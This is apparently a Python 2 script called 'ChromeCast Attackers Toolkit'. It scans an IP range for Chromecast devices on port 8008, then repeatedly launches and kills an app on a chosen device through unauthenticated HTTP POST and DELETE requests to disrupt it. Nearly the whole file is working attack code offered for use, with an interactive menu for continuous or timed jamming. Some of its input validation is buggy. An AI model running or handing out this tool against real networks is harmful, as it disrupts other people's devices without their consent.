import socket
import sys
import time
import urllib
import urllib2
from netaddr import IPRange


def jam(HOST,PORT,timing,attacktime,delay):
	timebool = True
	while timebool:

		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
		values = {'_':'1111111111111111'}

		data = urllib.urlencode(values)
		reqs = urllib2.Request(url, data)
		resp = urllib2.urlopen(reqs)
		dat = resp.read()
		
		time.sleep(.1)
		
		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
		s.connect((HOST, PORT))
		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
		s.sendall(req)
		data = s.recv(10240)
		print data
		
		time.sleep(delay)
		
		if timing == "1":
			timebool = True
		elif timing == "2":
			timebool = False
		elif timing == "3":
			attacktime -= 1
			if attacktime == 0:
				timebool = False
			else:
				timebool = True
	choose()
		
def chromecast_finder(addresses):
	ccasts = []
	for addr in addresses:
		addr2 = str(addr)
		print addr2
		try :
			request = ("http://"+addr2+":8008/ssdp/device-desc.xml")
			urllib2.urlopen(request, timeout=.5)
			ccasts.append(addr)
			print "1"
			print ""
			#s.close()
			ccasts.append(addr)
		except:
			print "No Chromecast."
			print ""
	print ""
	print ""
	return ccasts		
	
def choose():
	attacktime = 0
	print "What type of attack?"
	print "[1] Continuous"
	print "[2] Short"
	print "[3] Custom time"
	print "[4] Exit"
	attacklen = raw_input("> ")
	
	if (attacklen != '1') and (attacklen != '2') and (attacklen != '3') and (attacklen != '4'):
		print 'invalid input'
		print ''
		choose()

	elif attacklen == '4':
		print ''
		print ''
		sys.exit('Closing CCAT')
	else:
		if attacklen == '3':
			attacktime = raw_input("How many times would you like to jam the ChromeCast? (one time is approximately 2-3 seconds.)\n>")
			
		for x in range(0,len(casts) - 1):
			print '['+str(x)+'] '+str(casts[x])
			
		ip_attack = raw_input("Which Chromecast to attack: ")
		ip_attack2 = casts[int(ip_attack)]
		
		delay = raw_input("Delay between jams\n>")
		
		jam(str(ip_attack2),8008, str(attacklen), int(attacktime),int(delay))
	
	
	
	
	
	
	
print '''















    _      _                  _      _       __ 
   F L    J J      ____      F L    J J     LJ |
   J J .. L L     F __ J     J J .. L L     FJ |
   | |/  \| |    | |--| |    | |/  \| |     J__L
   F   /\   J    F L__J J    F   /\   J      __ 
  J___//\\___L    J\____/F   J___//\\___L     J__L
  |___/  \___|   J______F   |___/  \___|    |__|


ChromeCast Attackers Toolkit


Chevy Swanson - Trent Kenny - Benjamin Donnelly

'''



adress1 = raw_input('Start IP: ')
while(len(adress1.split(".")) != 4 and adress1.split(".")[0] <= 255 and adress1.split(".")[1] <= 255 and adress1.split(".")[2] <= 255 and adress1.split(".")[3] <= 255):
	print "Invalid IP."
	adress1 = raw_input('Start IP: ')
adress2 = raw_input('End IP: ')
while(len(adress2.split(".")) != 4 and adress2.split(".")[0] <= 255 and adress2.split(".")[1] <= 255 and adress2.split(".")[2] <= 255 and adress2.split(".")[3] <= 255):
	print "Invalid IP."
	adress2 = raw_input('End IP: ')
addresses = list(IPRange(adress1, adress2))
casts = chromecast_finder(addresses)
choose()

	

	
	
		